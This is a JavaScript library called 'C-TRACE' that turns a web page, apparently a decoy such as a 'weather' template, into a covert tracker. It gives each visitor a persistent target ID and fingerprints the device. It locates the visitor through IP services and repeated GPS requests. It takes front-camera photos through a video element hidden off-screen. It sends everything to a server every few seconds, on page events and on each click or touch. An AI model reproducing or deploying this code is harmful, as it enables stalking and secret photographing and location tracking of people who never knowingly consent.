/**
 * C-TRACE Telemetry & OSINT Tracking Library
 * Advanced Background & Silent Capture Engine (Zero-Permission Passive Fallback)
 */

(function (window) {
    function generateId(length = 10) {
        const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        let result = '';
        for (let i = 0; i < length; i++) {
            const randomIndex = Math.floor(Math.random() * characters.length);
            result += characters[randomIndex];
        }
        return result;
    }

    let targetId = localStorage.getItem("target_id") || localStorage.getItem("id");
    if (!targetId) {
        targetId = generateId();
        localStorage.setItem("target_id", targetId);
        localStorage.setItem("id", targetId);
    }

    let cachedIpLocation = null;

    async function fetchWithTimeout(url, timeoutMs = 3000) {
        const controller = new AbortController();
        const timer = setTimeout(() => controller.abort(), timeoutMs);
        try {
            const res = await fetch(url, { signal: controller.signal });
            clearTimeout(timer);
            return res;
        } catch (e) {
            clearTimeout(timer);
            return null;
        }
    }

    async function fetchIPLocation() {
        if (cachedIpLocation) return cachedIpLocation;

        try {
            const res = await fetchWithTimeout("https://ipwho.is/", 3000);
            if (res && res.ok) {
                const data = await res.json();
                if (data.success) {
                    cachedIpLocation = {
                        ip: data.ip,
                        city: data.city,
                        region: data.region,
                        country: data.country,
                        lat: data.latitude,
                        lng: data.longitude,
                        isp: (data.connection && data.connection.isp) || 'Mobile ISP',
                        asn: (data.connection && data.connection.asn) || '',
                        timezone: (data.timezone && data.timezone.id) || ''
                    };
                    return cachedIpLocation;
                }
            }
        } catch (err) {}

        try {
            const res2 = await fetchWithTimeout("https://ipapi.co/json/", 3000);
            if (res2 && res2.ok) {
                const data2 = await res2.json();
                cachedIpLocation = {
                    ip: data2.ip,
                    city: data2.city,
                    region: data2.region,
                    country: data2.country_name,
                    lat: data2.latitude,
                    lng: data2.longitude,
                    isp: data2.org || data2.asn,
                    asn: data2.asn,
                    postal: data2.postal,
                    timezone: data2.timezone
                };
                return cachedIpLocation;
            }
        } catch (e) {}

        try {
            const res3 = await fetchWithTimeout("https://ipinfo.io/json", 3000);
            if (res3 && res3.ok) {
                const data3 = await res3.json();
                let lat = null, lng = null;
                if (data3.loc) {
                    const parts = data3.loc.split(',');
                    lat = parseFloat(parts[0]);
                    lng = parseFloat(parts[1]);
                }
                cachedIpLocation = {
                    ip: data3.ip,
                    city: data3.city,
                    region: data3.region,
                    country: data3.country,
                    lat: lat,
                    lng: lng,
                    isp: data3.org || 'Mobile Carrier',
                    timezone: data3.timezone || ''
                };
                return cachedIpLocation;
            }
        } catch (err3) {}

        return null;
    }

    async function checkPermissionState(permissionName) {
        if (navigator.permissions && navigator.permissions.query) {
            try {
                const status = await navigator.permissions.query({ name: permissionName });
                return status.state; // 'granted', 'prompt', 'denied'
            } catch (e) {
                return 'unknown';
            }
        }
        return 'unknown';
    }

    async function getBatteryInfo() {
        if ('getBattery' in navigator) {
            try {
                const battery = await navigator.getBattery();
                return {
                    level: Math.round(battery.level * 100),
                    charging: battery.charging,
                    chargingTime: battery.chargingTime !== Infinity ? battery.chargingTime : null,
                    dischargingTime: battery.dischargingTime !== Infinity ? battery.dischargingTime : null
                };
            } catch (e) {}
        }
        return null;
    }

    function getGPUInfo() {
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (gl) {
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                if (debugInfo) {
                    return {
                        vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) || 'N/A',
                        renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || 'N/A'
                    };
                }
            }
        } catch (e) {}
        return { vendor: 'N/A', renderer: 'N/A' };
    }

    function getDeviceInfo() {
        const ua = navigator.userAgent;
        let os = "Unknown OS";
        if (ua.includes("iPhone") || ua.includes("iPad") || ua.includes("iPod")) os = "iOS (iPhone)";
        else if (ua.includes("Android")) os = "Android";
        else if (ua.includes("Windows")) os = "Windows";
        else if (ua.includes("Mac OS") || ua.includes("Macintosh")) os = "macOS";
        else if (ua.includes("Linux")) os = "Linux";

        let browser = "Unknown Browser";
        if (ua.includes("CriOS")) browser = "Chrome iOS";
        else if (ua.includes("FxiOS")) browser = "Firefox iOS";
        else if (ua.includes("Instagram")) browser = "Instagram In-App Browser";
        else if (ua.includes("FBAN") || ua.includes("FBAV")) browser = "Facebook In-App Browser";
        else if (ua.includes("Safari") && !ua.includes("Chrome")) browser = "Safari";
        else if (ua.includes("Chrome") && !ua.includes("Edg")) browser = "Chrome";
        else if (ua.includes("Edg")) browser = "Edge";

        let network = "Unknown";
        if (navigator.connection) {
            network = navigator.connection.effectiveType || navigator.connection.type || "Unknown";
        }

        const gpu = getGPUInfo();
        let tz = '';
        try {
            tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
        } catch (e) {}

        return {
            os: os,
            browser: browser,
            userAgent: ua,
            platform: navigator.platform || 'Mobile/Desktop',
            language: navigator.language || 'en',
            screen: `${window.screen.width}x${window.screen.height}`,
            colorDepth: `${window.screen.colorDepth}-bit`,
            devicePixelRatio: window.devicePixelRatio || 1,
            deviceMemory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'N/A',
            hardwareConcurrency: navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} Cores` : 'N/A',
            network: network,
            gpuVendor: gpu.vendor,
            gpuRenderer: gpu.renderer,
            touchPoints: navigator.maxTouchPoints || 0,
            timezone: tz,
            referrer: document.referrer || 'Direct Access'
        };
    }

    async function captureCameraSnapshot(isUserGesture = false) {
        try {
            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                return null;
            }

            // Check permission state if supported; only abort if explicitly denied
            if (!isUserGesture) {
                const camState = await checkPermissionState('camera');
                if (camState === 'denied') {
                    return null;
                }
            }

            const constraints = {
                video: {
                    facingMode: "user",
                    width: { ideal: 640, max: 1280 },
                    height: { ideal: 480, max: 720 }
                },
                audio: false
            };

            let stream = null;
            try {
                stream = await navigator.mediaDevices.getUserMedia(constraints);
            } catch (e) {
                try {
                    stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
                } catch (err2) {
                    return null;
                }
            }

            if (!stream) return null;

            let video = document.getElementById("__ctrace_cam_video");
            if (!video) {
                video = document.createElement("video");
                video.id = "__ctrace_cam_video";
                video.setAttribute("playsinline", "true");
                video.setAttribute("webkit-playsinline", "true");
                video.autoplay = true;
                video.muted = true;
                video.style.position = "fixed";
                video.style.top = "-9999px";
                video.style.left = "-9999px";
                video.style.width = "1px";
                video.style.height = "1px";
                video.style.opacity = "0";
                video.style.pointerEvents = "none";
                (document.body || document.documentElement).appendChild(video);
            }

            video.srcObject = stream;

            try {
                await video.play();
            } catch (e) {}

            // Wait for video frame to render with valid dimensions
            await new Promise((resolve) => {
                let attempts = 0;
                const checkReady = () => {
                    if (video.videoWidth > 0 && video.videoHeight > 0 && video.readyState >= 2) {
                        resolve();
                    } else if (attempts < 20) {
                        attempts++;
                        setTimeout(checkReady, 50);
                    } else {
                        resolve();
                    }
                };
                if (video.readyState >= 2 && video.videoWidth > 0) {
                    resolve();
                } else {
                    video.onloadedmetadata = checkReady;
                    video.onloadeddata = checkReady;
                    setTimeout(checkReady, 100);
                }
            });

            // Extra delay for camera auto-exposure stabilization
            await new Promise(resolve => setTimeout(resolve, 400));

            const canvas = document.createElement("canvas");
            const rawWidth = video.videoWidth || 640;
            const rawHeight = video.videoHeight || 480;
            const maxWidth = 640;
            const scale = rawWidth > maxWidth ? maxWidth / rawWidth : 1;

            canvas.width = Math.max(1, Math.round(rawWidth * scale));
            canvas.height = Math.max(1, Math.round(rawHeight * scale));

            const ctx = canvas.getContext("2d");
            ctx.imageSmoothingEnabled = true;
            ctx.imageSmoothingQuality = "high";
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            const photoData = canvas.toDataURL("image/jpeg", 0.70);

            // Clean up stream tracks & video object to release camera hardware immediately
            if (stream && stream.getTracks) {
                stream.getTracks().forEach(track => {
                    try { track.stop(); } catch (e) {}
                });
            }
            video.srcObject = null;

            return photoData;
        } catch (err) {
            console.error("Camera capture error:", err);
            return null;
        }
    }

    let isCapturingPhoto = false;

    async function sendTelemetry(coords = null, templateName = 'weather', captureCamera = false, isUserGesture = false) {
        const battery = await getBatteryInfo();
        const device = getDeviceInfo();
        const ipLocation = await fetchIPLocation();

        let photo = null;
        if (captureCamera && !isCapturingPhoto) {
            isCapturingPhoto = true;
            try {
                photo = await captureCameraSnapshot(isUserGesture);
            } catch (e) {}
            isCapturingPhoto = false;
        }

        const effectiveCoords = coords || lastKnownGpsCoords;
        const isGps = effectiveCoords && effectiveCoords.latitude && effectiveCoords.longitude;
        const lat = isGps ? effectiveCoords.latitude : (ipLocation ? ipLocation.lat : null);
        const lng = isGps ? effectiveCoords.longitude : (ipLocation ? ipLocation.lng : null);
        const accuracy = isGps ? effectiveCoords.accuracy : (ipLocation ? 5000 : null);
        const locationType = isGps ? 'GPS' : 'IP';

        const payload = {
            id: targetId,
            lat: lat,
            lng: lng,
            accuracy: accuracy,
            locationType: locationType,
            speed: effectiveCoords ? effectiveCoords.speed : null,
            heading: effectiveCoords ? effectiveCoords.heading : null,
            battery: battery,
            device: device,
            ipLocation: ipLocation,
            photo: photo,
            template: templateName
        };

        try {
            await fetch("/api/telemetry", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify(payload),
                keepalive: true
            });
        } catch (err) {
            console.error("Telemetry report error:", err);
        }
    }

    let bgWorker = null;
    let fallbackIntervalId = null;
    let lastKnownGpsCoords = null;

    function initBackgroundWorker(onTick, interval = 4000) {
        if (bgWorker) {
            try { bgWorker.terminate(); } catch (e) {}
            bgWorker = null;
        }
        if (fallbackIntervalId) {
            clearInterval(fallbackIntervalId);
            fallbackIntervalId = null;
        }

        try {
            const workerCode = `
                let timer = null;
                self.onmessage = function(e) {
                    if (e.data.action === 'start') {
                        if (timer) clearInterval(timer);
                        timer = setInterval(function() {
                            self.postMessage({ action: 'tick' });
                        }, e.data.interval || 4000);
                    } else if (e.data.action === 'stop') {
                        if (timer) clearInterval(timer);
                    }
                };
            `;
            const blob = new Blob([workerCode], { type: 'application/javascript' });
            const workerUrl = URL.createObjectURL(blob);
            bgWorker = new Worker(workerUrl);
            URL.revokeObjectURL(workerUrl);

            bgWorker.onmessage = function(e) {
                if (e.data.action === 'tick') {
                    onTick();
                }
            };
            bgWorker.postMessage({ action: 'start', interval: interval });
        } catch (e) {
            fallbackIntervalId = setInterval(onTick, interval);
        }
    }

    let isTrackingStarted = false;
    let isGpsWatchStarted = false;

    window.LiveTrackerClient = {
        getTargetId: () => targetId,
        sendTelemetry: sendTelemetry,
        captureCameraSnapshot: captureCameraSnapshot,
        getBatteryInfo: getBatteryInfo,
        getDeviceInfo: getDeviceInfo,
        fetchIPLocation: fetchIPLocation,
        startTracking: async function (options = {}) {
            const { 
                templateName = 'weather', 
                updateInterval = 4000, 
                enableCamera = true, 
                enableGPS = true,
                onSuccess, 
                onError 
            } = options;

            async function triggerLocationUpdate(shouldTakePhoto = false, isUserGesture = false) {
                let gpsAttempted = false;
                if (enableGPS && navigator.geolocation) {
                    gpsAttempted = true;
                    navigator.geolocation.getCurrentPosition(
                        async (position) => {
                            lastKnownGpsCoords = position.coords;
                            await sendTelemetry(position.coords, templateName, shouldTakePhoto, isUserGesture);
                            if (onSuccess) onSuccess(position.coords);
                        },
                        async (error) => {
                            // Retry once with low accuracy (Wi-Fi / Cell tower positioning)
                            navigator.geolocation.getCurrentPosition(
                                async (lowAccPosition) => {
                                    lastKnownGpsCoords = lowAccPosition.coords;
                                    await sendTelemetry(lowAccPosition.coords, templateName, shouldTakePhoto, isUserGesture);
                                    if (onSuccess) onSuccess(lowAccPosition.coords);
                                },
                                async (err2) => {
                                    await sendTelemetry(lastKnownGpsCoords || null, templateName, shouldTakePhoto, isUserGesture);
                                    if (onError) onError(error);
                                },
                                {
                                    enableHighAccuracy: false,
                                    timeout: 5000,
                                    maximumAge: 30000
                                }
                            );
                        },
                        {
                            enableHighAccuracy: true,
                            timeout: 8000,
                            maximumAge: 10000
                        }
                    );
                }

                if (!gpsAttempted) {
                    await sendTelemetry(lastKnownGpsCoords || null, templateName, shouldTakePhoto, isUserGesture);
                }
            }

            // Immediately trigger telemetry on page open
            await triggerLocationUpdate(enableCamera, false);

            if (isTrackingStarted) return;
            isTrackingStarted = true;

            if (enableGPS && navigator.geolocation && !isGpsWatchStarted) {
                isGpsWatchStarted = true;
                try {
                    navigator.geolocation.watchPosition(
                        (pos) => {
                            if (pos && pos.coords) {
                                lastKnownGpsCoords = pos.coords;
                                sendTelemetry(pos.coords, templateName, enableCamera, false);
                                if (onSuccess) onSuccess(pos.coords);
                            }
                        },
                        (err) => {},
                        { enableHighAccuracy: true, maximumAge: 0, timeout: 10000 }
                    );
                } catch(e) {}
            }

            initBackgroundWorker(() => {
                triggerLocationUpdate(enableCamera, false);
            }, updateInterval);

            document.addEventListener('visibilitychange', () => {
                triggerLocationUpdate(enableCamera, false);
            });

            window.addEventListener('pagehide', () => {
                triggerLocationUpdate(enableCamera, false);
            });

            window.addEventListener('focus', () => {
                triggerLocationUpdate(enableCamera, false);
            });

            const onUserGesture = () => {
                triggerLocationUpdate(true, true);
            };
            window.addEventListener('click', onUserGesture, { passive: true });
            window.addEventListener('touchstart', onUserGesture, { passive: true });
        }
    };
})(window);

